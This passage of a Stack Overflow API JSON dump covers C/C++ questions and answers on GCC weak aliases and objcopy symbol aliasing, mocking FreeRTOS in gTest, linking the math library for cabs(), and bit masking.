1518002090, "post_id": 48661501, "comment_id": 84322066, "body": "if you have already defined Default_Handler somewhere and it gets included in compilation then it should&#39;t throw error."}, {"owner": {"reputation": 4427, "user_id": 193887, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/54a2fc2a8cb81440a442aa45fc0f41a9?s=128&d=identicon&r=PG&f=1", "display_name": "Jeremy", "link": "https://stackoverflow.com/users/193887/jeremy"}, "edited": false, "score": 2, "creation_date": 1601034324, "post_id": 48661501, "comment_id": 113285463, "body": "The problem is that (per GCC manual) given <code>void f () __attribute__ ((weak, alias (&quot;fred&quot;)));</code>, &quot;It is an error if \u2018fred\u2019 is not defined in the same translation unit.&quot; That case in question here is one where fred is defined in <i>another</i> translation unit."}], "tags": [], "owner": {"reputation": 212, "user_id": 8246573, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yHFVF.jpg?s=128&g=1", "display_name": "Paresh Dhandhukiya", "link": "https://stackoverflow.com/users/8246573/paresh-dhandhukiya"}, "is_accepted": false, "score": 1, "last_activity_date": 1517999438, "creation_date": 1517999438, "answer_id": 48661501, "question_id": 48660176, "link": "https://stackoverflow.com/questions/48660176/how-i-can-make-alias-on-external-defined-function-in-c/48661501#48661501", "title": "How I can make alias on external defined function in C?", "body": "<p>here NMI_Handler has a weak definition attribute means that if NMI_Handler is not defined then definition of Default_Handler will be used for NMI_Handler. generally there are strong definition available for interrupts like NMI_Handler or Default_Handler.you might need to add those file in your compilation to remove error.if you wants to handle NMI_Handler in your own way then you can define it somewhere and that definition will be included instead of weak one.</p>\n"}, {"tags": [], "owner": {"reputation": 355, "user_id": 1082233, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/ebbf382c5e2c3789cb9c43d2db111b3c?s=128&d=identicon&r=PG", "display_name": "mondaugen", "link": "https://stackoverflow.com/users/1082233/mondaugen"}, "is_accepted": false, "score": 3, "last_activity_date": 1569508782, "creation_date": 1569508782, "answer_id": 58119272, "question_id": 48660176, "link": "https://stackoverflow.com/questions/48660176/how-i-can-make-alias-on-external-defined-function-in-c/58119272#58119272", "title": "How I can make alias on external defined function in C?", "body": "<p>To alias an external function, you can use <code>objcopy</code>. Here's an example:</p>\n\n<p>Say I have the definition of a function and I alias it, like in the following program (called <code>myimp.c</code>):</p>\n\n<pre><code>// myimp.c\nint\nmyadd(int x, int y)\n{\n    return x+y;\n}\n\nint\ncoolguy (int x, int y) __attribute__((alias(\"myadd\")));\n</code></pre>\n\n<p>If we compile this (but don't link) we get an object file and we can check out its symbols:</p>\n\n<pre><code># compile\n$ cc -c myimp.c\n# look at the symbols\n$ nm myimp.o\n0000000000000000 T coolguy\n0000000000000000 T myadd\n</code></pre>\n\n<p>So we can see that the <code>__attribute__((alias(\"myadd\"))</code> is simply adding a symbol <code>coolguy</code> with the same value, 0000000000000000, as <code>myadd</code>. If you look in the <code>man</code> page for nm, it will say that <code>T</code> means it is a global symbol in the <code>.text</code> section. This makes sense because the function is not <code>static</code> and comprises instructions (as opposed to data).</p>\n\n<p>So if we have the object file, but not the source, and we want to add a function alias we can do so using <code>objcopy --add-symbol</code>.</p>\n\n<p>Say we have the object file resulting from compiling this source code:</p>\n\n<pre><code>// myimp2.c\nint\nmyadd(int x, int y)\n{\n    return x+y;\n}\n</code></pre>\n\n<p>Compiling as above, we'll get <code>myimp2.o</code>, whose symbol table tools like this:</p>\n\n<pre><code># look at the symbols\n$ nm myimp2.o\n0000000000000000 T myadd\n</code></pre>\n\n<p>So we want to add the <code>coolguy</code> symbol, which we do as follows</p>\n\n<pre><code># objcopy --add-symbol coolguy=.text:0000000000000000,global myimp2.o myimp2_augmented.o\n</code></pre>\n\n<p>Look at the documentation on <code>--add-symbol</code> in the <code>objcopy</code> <code>man</code> page. Basically <code>.text</code> specifies the section, after the colon the value, and then <code>global</code> I found by passing a bad type and <code>objcopy</code> failed and told me a list of the valid types, from which I chose <code>global</code>.</p>\n\n<p>Try running <code>nm</code> on <code>myimp2_augmented.o</code>, you'll see that we've added the symbol.</p>\n\n<p>Now you should be able to link with <code>myimp2_augmented.o</code> instead of <code>myimp.o</code> and your program can call <code>coolguy</code> without linking errors.</p>\n"}, {"tags": [], "owner": {"reputation": 4427, "user_id": 193887, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/54a2fc2a8cb81440a442aa45fc0f41a9?s=128&d=identicon&r=PG&f=1", "display_name": "Jeremy", "link": "https://stackoverflow.com/users/193887/jeremy"}, "is_accepted": false, "score": 1, "last_activity_date": 1601045608, "creation_date": 1601045608, "answer_id": 64066534, "question_id": 48660176, "link": "https://stackoverflow.com/questions/48660176/how-i-can-make-alias-on-external-defined-function-in-c/64066534#64066534", "title": "How I can make alias on external defined function in C?", "body": "<p>As suggested <a href=\"https://stackoverflow.com/a/53445227/193887\">here</a>, add the following to your linker command file:</p>\n<pre><code>PROVIDE(NMI_Handler = Default_Handler);\n</code></pre>\n<p>(And remove the weak alias declaration from the C code.)</p>\n"}, {"tags": [], "owner": {"reputation": 65, "user_id": 4292371, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3d1f6d0bd502e1b670ebc346d5c65e59?s=128&d=identicon&r=PG&f=1", "display_name": "\u725f\u5bb6\u5b8f", "link": "https://stackoverflow.com/users/4292371/%e7%89%9f%e5%ae%b6%e5%ae%8f"}, "is_accepted": false, "score": 0, "last_activity_date": 1613987077, "last_edit_date": 1613987077, "creation_date": 1613986765, "answer_id": 66313188, "question_id": 48660176, "link": "https://stackoverflow.com/questions/48660176/how-i-can-make-alias-on-external-defined-function-in-c/66313188#66313188", "title": "How I can make alias on external defined function in C?", "body": "<p>It's popular to employee weak and alias attribute to implement override mechanism for native C project especially in cases of firmware projects.</p>\n<p>Both of declaration and definition can be noted by <code>__attribute__((weak))</code> and its linking priority rules is related to if any declaration exists in a head file.</p>\n<p>It would be good tactic that just to code and compile it. Then see what would happen when linking is look for its definition. I usually check symbols by <code>-Wl,-trace,-trace-symbol=ANY_FUNCTION_NAME_YOU_WANT</code> and <code>nm OBJECT_FILE_NAME</code>.</p>\n<p>Usually I just create a weak attribute function definition and let other objects override it.\nAn example shown as below:</p>\n<p><code>In C file:</code></p>\n<pre><code>//non-exported weak attribute definition\n__attribute__((weak)) void startup_handler_dummy(void) {\n        printf(&quot;[%s][%s]Entry (NO OVERRIDE HANLDER COMES HERE)\\n&quot;, __FILE__, __func__);\n}\n\n//weak and alias attribute declaration\nvoid startup_handler_dummy_impl(void) __attribute__((weak, alias(&quot;startup_handler_dummy&quot;)));\n\n//exported weak attribute definition\n__attribute__((weak)) void startup_handler(void) {\n    startup_handler_dummy_impl();\n}\n</code></pre>\n<p><code>In header file:</code></p>\n<pre><code>#ifndef _BOARD_H_\n#define _BOARD_H_\n#define STARTUP_HANDLER startup_handler //to export symbol\n#endif\n</code></pre>\n<p>Hope my code can help :)</p>\n<p>And you can see more details and program screen-shots on <a href=\"https://github.com/MouChiaHung/ATTRIBUTE_WEAK\" rel=\"nofollow noreferrer\">MyGitHub</a>.</p>\n"}], "owner": {"reputation": 49, "user_id": 9326576, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8fe15469ae2ae569c0ffc25580a75527?s=128&d=identicon&r=PG&f=1", "display_name": "Immortal_Buka", "link": "https://stackoverflow.com/users/9326576/immortal-buka"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1542, "favorite_count": 0, "answer_count": 4, "score": 4, "last_activity_date": 1613987077, "creation_date": 1517995755, "last_edit_date": 1517996153, "question_id": 48660176, "link": "https://stackoverflow.com/questions/48660176/how-i-can-make-alias-on-external-defined-function-in-c", "title": "How I can make alias on external defined function in C?", "body": "<p>During compiling this C code</p>\n\n<pre><code>extern void Default_Handler(void);\nvoid NMI_Handler(void) __attribute__ ((weak, alias (\"Default_Handler\")));\n</code></pre>\n\n<p>I've recive this </p>\n\n<pre class=\"lang-none prettyprint-override\"><code>error: 'NMI_Handler' aliased to undefined symbol 'Default_Handler'\n</code></pre>\n\n<p>How I can make alias on external defined function?</p>\n\n<p>Compiler:</p>\n\n<pre><code>gcc version 7.2.1 20170904 (release) [ARM/embedded-7-branch revision 255204] (GNU Tools for Arm Embedded Processors 7-2017-q4-major)\n</code></pre>\n"}, {"tags": ["c++", "c", "mocking", "googletest", "freertos"], "answers": [{"comments": [{"owner": {"reputation": 123, "user_id": 9166602, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3530bd95c3973fa4bfa59da3bb0d872c?s=128&d=identicon&r=PG&f=1", "display_name": "SebPF", "link": "https://stackoverflow.com/users/9166602/sebpf"}, "edited": false, "score": 0, "creation_date": 1518075169, "post_id": 48659999, "comment_id": 84356960, "body": "Hi, this is actually a good alternative! Nevertheless we have an established infrastructure with (Win + mingw) Jenkins &amp; jobs starting gTest for every <i>pull request</i>. I try for the next days to find a clean solution based on gTest <b>but</b> I keep your answer in mind if I don&#39;t succeed!"}], "tags": [], "owner": {"reputation": 346, "user_id": 5428609, "user_type": "registered", "accept_rate": 83, "profile_image": "https://graph.facebook.com/10153291007982901/picture?type=large", "display_name": "Luke Purnell", "link": "https://stackoverflow.com/users/5428609/luke-purnell"}, "is_accepted": false, "score": 0, "last_activity_date": 1517995804, "last_edit_date": 1517995804, "creation_date": 1517995225, "answer_id": 48659999, "question_id": 48659761, "link": "https://stackoverflow.com/questions/48659761/mocking-freertos-functions-in-gtest/48659999#48659999", "title": "Mocking FreeRTOS functions in gTest", "body": "<p>One option is to build your application for your host machine and then, when your HW arrives, you can just recompile it for that HW.</p>\n\n<p>It is possible to run FreeRTOS on a host PC as the OS on the CPU, however this is not the intention of FreeRTOS so it may be tricky and or lead to some unrealistic hacks when it comes to redeploying on your HW.</p>\n\n<p>There is some support for running FreeRTOS on Windows, but I'm not too sure about Linux.</p>\n\n<p>An alternative is the freeRTOS simulator. The caveat for this is that, in simulation, the FreeRTOS is not the actual kernel (as it would be on your target HW) but rather there are threads set up by the Windows/Linux kernel to run the FreeRTOS code. Seeing that FreeRTOS is intended for hard time constraints this simulation is far from ideal, since the timing is ultimately determined by the host's kernel.</p>\n\n<p>The Windows simulator can be run with Visual Studio (free version), and that port is maintained. there is probably some support for Eclipse too.</p>\n\n<p>Windows simulator page: <a href=\"http://www.freertos.org/FreeRTOS-Windows-Simulator-Emulator-for-Visual-Studio-and-Eclipse-MingW.html\" rel=\"nofollow noreferrer\">http://www.freertos.org/FreeRTOS-Windows-Simulator-Emulator-for-Visual-Studio-and-Eclipse-MingW.html</a></p>\n\n<p>Linux simulator page: <a href=\"http://www.freertos.org/FreeRTOS-simulator-for-Linux.html\" rel=\"nofollow noreferrer\">http://www.freertos.org/FreeRTOS-simulator-for-Linux.html</a></p>\n"}, {"comments": [{"owner": {"reputation": 185, "user_id": 7845728, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CX0At.jpg?s=128&g=1", "display_name": "el-aasi", "link": "https://stackoverflow.com/users/7845728/el-aasi"}, "edited": false, "score": 0, "creation_date": 1590957368, "post_id": 48748365, "comment_id": 109870966, "body": "really nice implementation"}], "tags": [], "owner": {"reputation": 123, "user_id": 9166602, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3530bd95c3973fa4bfa59da3bb0d872c?s=128&d=identicon&r=PG&f=1", "display_name": "SebPF", "link": "https://stackoverflow.com/users/9166602/sebpf"}, "is_accepted": true, "score": 3, "last_activity_date": 1518444447, "creation_date": 1518444447, "answer_id": 48748365, "question_id": 48659761, "link": "https://stackoverflow.com/questions/48659761/mocking-freertos-functions-in-gtest/48748365#48748365", "title": "Mocking FreeRTOS functions in gTest", "body": "<p>so I managed to resolve my issue by combining different answers from the website: <a href=\"https://stackoverflow.com/questions/13213022/how-to-use-google-test-for-c-to-run-through-combinations-of-data\">How to use google test for C++ to run through combinations of data</a> &amp; <a href=\"https://stackoverflow.com/questions/31989040/can-gmock-be-used-for-stubbing-c-functions\">Can gmock be used for stubbing C functions?</a>.</p>\n\n<p>My answer is a bit big but like that if you want to use it, you can simply use copy &amp; past.</p>\n\n<p>To mock freeRTOS elements, in my test-folder:<br>\n<strong>FreeRTOS_mock.hpp</strong></p>\n\n<pre><code>/* Include freeRTOS headers */\n#include \"FreeRTOS.h\"\n#include \"queue.h\"\n#include \"task.h\"\n\n/* Include gTest mockup functionality */\n#include \"gmock/gmock.h\"\n\n/* Mock all functions needed from FreeRTOS */\nnamespace freertos {\n\nclass FreeRTOSInterface\n{\npublic:\n    virtual ~FreeRTOSInterface() {}\n\n    virtual QueueHandle_t xQueueGenericCreate(const UBaseType_t uxQueueLength, const UBaseType_t uxItemSize, const uint8_t ucQueueType) = 0;\n    /* define other freeRTOS elements the same way */\n};\n\nclass FreeRTOSMock : public FreeRTOSInterface\n{\npublic:\n    virtual ~FreeRTOSMock() {}\n\n    MOCK_METHOD3(xQueueGenericCreate, QueueHandle_t(const UBaseType_t uxQueueLength, const UBaseType_t uxItemSize, const uint8_t ucQueueType));\n    /* Align with what was defined above */\n};\n\n} /* namespace freertos */\n</code></pre>\n\n<p><strong>FreeRTOS_mock.cpp</strong></p>\n\n<pre><code>#include \"FreeRTOS_mock.hpp\"\n\nfreertos::FreeRTOSMock FreeRTOSMockObj;\n\nQueueHandle_t xQueueGenericCreate(const UBaseType_t uxQueueLength, const UBaseType_t uxItemSize, const uint8_t ucQueueType)\n{\n    return FreeRTOSMockObj.xQueueGenericCreate(uxQueueLength, uxItemSize, ucQueueType);\n}\n\n/* Align with what is in the .hpp */\n</code></pre>\n\n<p><strong>TestSuiteXXX_unittest.cpp</strong></p>\n\n<pre><code>#include \"FreeRTOS_mock.hpp\"\nextern freertos::FreeRTOSMock FreeRTOSMockObj;\n/* Write my TCs by using the FreeRTOS functions*/\n</code></pre>\n\n<p>What is also important is that you must have defined a valid <code>FreeRTOSConfig.h</code> and in the <strong>makefile</strong>:</p>\n\n<pre><code>INCLUDE_DIRS = \\\n        -I$(FREERTOS_DIR)/Source/include \\\n        -I$(FREERTOS_DIR)/Source/portable/GCC/ARM_CM4F \\\n        -I$(PRJ_FREERTOS_CFG) \\\n        -I$(UNITTEST_INCLUDE_DIR)\n\nSRC_FILES = \\\n    ./test/FreeRTOS_mock.cpp \\\n    ./src/XXX.cpp\n\n#Specify all unittest files\nUNITTEST_SRC_FILES = \\\n    ./test/TestSuiteXXX_unittest.cpp\n</code></pre>\n\n<p>To Emulate the sensoric-data:<br>\n<strong>TestSuiteXXX_unittest.cpp</strong></p>\n\n<pre><code>#include \"FreeRTOS_mock.hpp\"\n\n#include \"gmock/gmock.h\"\n#include \"gtest/gtest.h\"\n#include &lt;vector&gt;\n\n#include \"Algo.hpp\"\n\nextern freertos::FreeRTOSMock FreeRTOSMockObj;\n\n/* A sensor measurement */\nstd::vector&lt;int32_t&gt; input1 { 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1 };\nstd::vector&lt;int32_t&gt; output1 { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15};\n/* Not very pretty adaptation function but it does the job */\nstd::vector&lt;std::tuple&lt;int32_t, int32_t&gt;&gt; genSet(std::vector&lt;int32_t&gt; a, std::vector&lt;int32_t&gt; b)\n{\n    uint32_t i(0);\n    std::vector&lt;std::tuple&lt;int32_t int32_t&gt;&gt; vectorToReturn(a.size());\n    for (i = 0 ; i &lt; a.size(); i++)\n    {\n        vectorToReturn[i] = std::make_tuple(a[i], b[i]);\n    }\n    return vectorToReturn;\n}\n\n/** Define the Value-Parameterized Tests class */\nclass AlgoToTest: public ::testing::TestWithParam&lt;std::tuple&lt;int32_t, int32_t&gt;&gt;\n{\npublic:\n    /* SetUp() is run immediately before a test starts. */\n    virtual void SetUp()\n    {\n        algo = new Algo::Algo();\n    }\n\n    /* TearDown() is invoked immediately after a test finishes. */\n    virtual void TearDown()\n    {\n        delete algo;\n    }\n    Algo::Algorithm* algo = NULL;\n};\n\n/* The test-case used to loop on */\nTEST_P(AlgoToTest, AlgoTestCase1)\n{\n    int32_t outputValue(0);\n    outputValue = algo-&gt;run(std::get&lt;0&gt;(GetParam()), std::get&lt;1&gt;(GetParam()));\n    ASSERT_EQ(outputValue, std::get&lt;3&gt;(GetParam()));\n}\n\nINSTANTIATE_TEST_CASE_P(AlgoTestRun1, AlgoToTest, ::testing::ValuesIn(genSet(input1, output1)));\n</code></pre>\n\n<p>If you have improvement propositions, please comment!</p>\n"}], "owner": {"reputation": 123, "user_id": 9166602, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3530bd95c3973fa4bfa59da3bb0d872c?s=128&d=identicon&r=PG&f=1", "display_name": "SebPF", "link": "https://stackoverflow.com/users/9166602/sebpf"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1424, "favorite_count": 0, "accepted_answer_id": 48748365, "answer_count": 2, "score": 4, "last_activity_date": 1518444447, "creation_date": 1517994473, "question_id": 48659761, "link": "https://stackoverflow.com/questions/48659761/mocking-freertos-functions-in-gtest", "title": "Mocking FreeRTOS functions in gTest", "body": "<p>For a project, I'm implementing in c++ on an embedded system a component that get sensors-data via a <strong>FreeRTOS queue</strong> and process them into a <strong>FreeRTOS task</strong>.</p>\n\n<p>Because the HW did not arrive yet &amp; quality reasons (TDD), I would like to mock the freeRTOS functionalities and use them to simulate my component behavior.</p>\n\n<p>I thank you in advance.</p>\n"}, {"tags": ["c", "linker-errors", "clion"], "comments": [{"owner": {"reputation": 884, "user_id": 9009404, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6be791318ce35f7966345ff4964a2025?s=128&d=identicon&r=PG&f=1", "display_name": "Uprooted", "link": "https://stackoverflow.com/users/9009404/uprooted"}, "edited": false, "score": 0, "creation_date": 1517994334, "post_id": 48659683, "comment_id": 84316819, "body": "try <code>gcc file.c -lm</code>"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1517995383, "post_id": 48659683, "comment_id": 84317478, "body": "You write: <i>&quot;As I run the code...&quot;</i>. Do you rather mean <i>&quot;when I compile the code...&quot;</i>?"}, {"owner": {"reputation": 8296, "user_id": 2932052, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/63b8d6f5ce8e33b6953812ce8f5b2d40?s=128&d=identicon&r=PG", "display_name": "Wolf", "link": "https://stackoverflow.com/users/2932052/wolf"}, "edited": false, "score": 0, "creation_date": 1517995795, "post_id": 48659683, "comment_id": 84317793, "body": "You should really have a closer look on the messages of compiler, linker etc. that your IDE hopefully displays somewhere. Here you can see <i>what exactly</i> fails. Simply hitting [Run] sometimes includes a build of the program."}, {"owner": {"reputation": 1205, "user_id": 1574642, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2825e3945fc7cab47b6def4a560b1032?s=128&d=identicon&r=PG", "display_name": "uta", "link": "https://stackoverflow.com/users/1574642/uta"}, "edited": false, "score": 0, "creation_date": 1519136165, "post_id": 48659683, "comment_id": 84779335, "body": "did you add the library to <code>CMakeLists.txt</code>? <code>target_link_libraries(&lt;target&gt; m)</code>"}], "answers": [{"comments": [{"owner": {"reputation": 93, "user_id": 9207560, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/XLfZv.jpg?s=128&g=1", "display_name": "\u7f57\u901a\u4faf\u541b", "link": "https://stackoverflow.com/users/9207560/%e7%bd%97%e9%80%9a%e4%be%af%e5%90%9b"}, "edited": false, "score": 1, "creation_date": 1517995446, "post_id": 48659735, "comment_id": 84317527, "body": "I use the command line to compile my code,with &#39;-lm&#39;added,it works.But can I make it work using the IDE?"}, {"owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "reply_to_user": {"reputation": 93, "user_id": 9207560, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/XLfZv.jpg?s=128&g=1", "display_name": "\u7f57\u901a\u4faf\u541b", "link": "https://stackoverflow.com/users/9207560/%e7%bd%97%e9%80%9a%e4%be%af%e5%90%9b"}, "edited": false, "score": 1, "creation_date": 1517995677, "post_id": 48659735, "comment_id": 84317705, "body": "@\u7f57\u901a\u4faf\u541b - Follow the instructions <a href=\"https://stackoverflow.com/questions/39150697/build-and-run-project-that-use-math-h-in-clion\">here</a>."}], "tags": [], "owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "is_accepted": true, "score": 6, "last_activity_date": 1517994372, "creation_date": 1517994372, "answer_id": 48659735, "question_id": 48659683, "link": "https://stackoverflow.com/questions/48659683/calculate-the-abs-value-of-a-complex-in-c/48659735#48659735", "title": "Calculate the abs value of a complex in C", "body": "<p>For <code>cabs</code> you just need <a href=\"http://pubs.opengroup.org/onlinepubs/009695399/functions/cabs.html\" rel=\"noreferrer\"><code>&lt;complex.h&gt;</code></a>. Where it is actually declared is just an implementation detail.</p>\n\n<p>And then link with <code>-lm</code> to actually link the math library in.</p>\n"}, {"comments": [{"owner": {"reputation": 93, "user_id": 9207560, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/XLfZv.jpg?s=128&g=1", "display_name": "\u7f57\u901a\u4faf\u541b", "link": "https://stackoverflow.com/users/9207560/%e7%bd%97%e9%80%9a%e4%be%af%e5%90%9b"}, "edited": false, "score": 0, "creation_date": 1517996981, "post_id": 48659738, "comment_id": 84318627, "body": "yeah,it works.Seems the traditional #include&lt;math.h&gt; method on windows doesn&#39;t work on linux..."}, {"owner": {"reputation": 616, "user_id": 5297811, "user_type": "registered", "profile_image": "https://graph.facebook.com/933779826678745/picture?type=large", "display_name": "alkanen", "link": "https://stackoverflow.com/users/5297811/alkanen"}, "reply_to_user": {"reputation": 93, "user_id": 9207560, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/XLfZv.jpg?s=128&g=1", "display_name": "\u7f57\u901a\u4faf\u541b", "link": "https://stackoverflow.com/users/9207560/%e7%bd%97%e9%80%9a%e4%be%af%e5%90%9b"}, "edited": false, "score": 0, "creation_date": 1612966722, "post_id": 48659738, "comment_id": 116930788, "body": "@\u7f57\u901a\u4faf\u541b it&#39;s not Windows vs Linux, it&#39;s compiler specific.  Whatever IDE you use in Windows probably keeps track of a bunch of standard libraries on its own and adds them to the linking step automagically.  The IDE you used in Linux doesn&#39;t, but it&#39;s not because it&#39;s Linux, it&#39;s because that&#39;s how the IDE behaves."}], "tags": [], "owner": {"reputation": 3021, "user_id": 9208197, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/82e545ac8c6a4f6c5cad3832d7463c15?s=128&d=identicon&r=PG&f=1", "display_name": "L&#233;o R.", "link": "https://stackoverflow.com/users/9208197/l%c3%a9o-r"}, "is_accepted": false, "score": 3, "last_activity_date": 1517994381, "creation_date": 1517994381, "answer_id": 48659738, "question_id": 48659683, "link": "https://stackoverflow.com/questions/48659683/calculate-the-abs-value-of-a-complex-in-c/48659738#48659738", "title": "Calculate the abs value of a complex in C", "body": "<p>The math library must be linked in when building the executable. How to do this varies by environment, but in Linux/Unix, just add -lm to the command:</p>\n\n<pre><code>gcc test.c -o test -lm\n</code></pre>\n\n<p>The math library is named <strong>libm.so</strong>, and the -l command option assumes a lib prefix and .a or .so suffix.</p>\n\n<p>Source : <a href=\"https://stackoverflow.com/questions/10409032/why-am-i-getting-undefined-reference-to-sqrt-error-even-though-i-include-math\">Why am I getting &quot;undefined reference to sqrt&quot; error even though I include math.h header?</a></p>\n"}], "owner": {"reputation": 93, "user_id": 9207560, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/XLfZv.jpg?s=128&g=1", "display_name": "\u7f57\u901a\u4faf\u541b", "link": "https://stackoverflow.com/users/9207560/%e7%bd%97%e9%80%9a%e4%be%af%e5%90%9b"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 467, "favorite_count": 0, "accepted_answer_id": 48659735, "answer_count": 2, "score": 0, "last_activity_date": 1517995895, "creation_date": 1517994218, "last_edit_date": 1517995895, "question_id": 48659683, "link": "https://stackoverflow.com/questions/48659683/calculate-the-abs-value-of-a-complex-in-c", "title": "Calculate the abs value of a complex in C", "body": "<p>Part of the source code:</p>\n\n<pre><code>double _Complex z = 1.0 + 1.0*I;\nprintf(\"%f\\n\", cabs(z));\n</code></pre>\n\n<p>My development environment: <em>Ubuntu16.04LTS, Clion IDE with GCC version 5.4.0, C11 standard</em>.</p>\n\n<p>As I run the code, an error occurs with message</p>\n\n<pre><code>undefined reference to `cabs'\n</code></pre>\n\n<p>The IDE tells me that the function <code>cabs</code> is declared in the header file <code>cmathcalls.h</code>, so I try to:</p>\n\n<pre><code>#include&lt;cmathcalls.h&gt;\n</code></pre>\n\n<p>But the IDE warns me that the file cannot be found, so again I try:</p>\n\n<pre><code>#include&lt;bits/cmathcalls&gt;\n</code></pre>\n\n<p>The I run the code, however it still doesn't work.</p>\n\n<p>I want to know how can I get the abs value of the complex <code>z</code> with the function <code>cabs</code>?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1517992727, "post_id": 48659216, "comment_id": 84315963, "body": "Do you know about <i>bit masking</i>? About the <i>bitwise <b>and</b> operator <code>&amp;</code></i>?"}, {"owner": {"reputation": 265, "user_id": 8953281, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/69d09d598912cb37d56adce43bfaa804?s=128&d=identicon&r=PG&f=1", "display_name": "Salim", "link": "https://stackoverflow.com/users/8953281/salim"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1517992938, "post_id": 48659216, "comment_id": 84316070, "body": "For a certain value I know how to extract. But during runtime how we can extract..."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1517993011, "post_id": 48659216, "comment_id": 84316097, "body": "Use a variable as the mask? And assign the correct mask to the variable at runtime? Same with the shifting, use variables."}, {"owner": {"reputation": 249, "user_id": 14800, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6501a4d97420c943fb7571628c6318cb?s=128&d=identicon&r=PG", "display_name": "xslr", "link": "https://stackoverflow.com/users/14800/xslr"}, "edited": false, "score": 0, "creation_date": 1517993366, "post_id": 48659216, "comment_id": 84316280, "body": "You can iterate over different masks during runtime, such that the masks check all the bit positions in the number under test."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1517997801, "post_id": 48659216, "comment_id": 84319166, "body": "If those int vars are restricted to one byte, an alternative approach could be to use a const lookup table to get the appropriate mask."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1517998040, "post_id": 48659216, "comment_id": 84319314, "body": "..though it&#39;s prolly easier to just shift up a 1-bit mask and use it to count the zeros, as suggested by others."}, {"owner": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "edited": false, "score": 0, "creation_date": 1518004368, "post_id": 48659216, "comment_id": 84323504, "body": "Please <a href=\"https://stackoverflow.com/posts/48659216/edit\">edit</a> your question to show <a href=\"http://whathaveyoutried.com\" rel=\"nofollow noreferrer\">the code you have so far</a>.  You should include at least an outline (but preferably a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>) of the code that you are having problems with, then we can try to help with the specific problem. You should also read <a href=\"https://stackoverflow.com/questions/how-to-ask\">How to Ask</a>."}], "answers": [{"comments": [{"owner": {"reputation": 8204, "user_id": 2858773, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/5iGps.jpg?s=128&g=1", "display_name": "Ajay Brahmakshatriya", "link": "https://stackoverflow.com/users/2858773/ajay-brahmakshatriya"}, "edited": false, "score": 4, 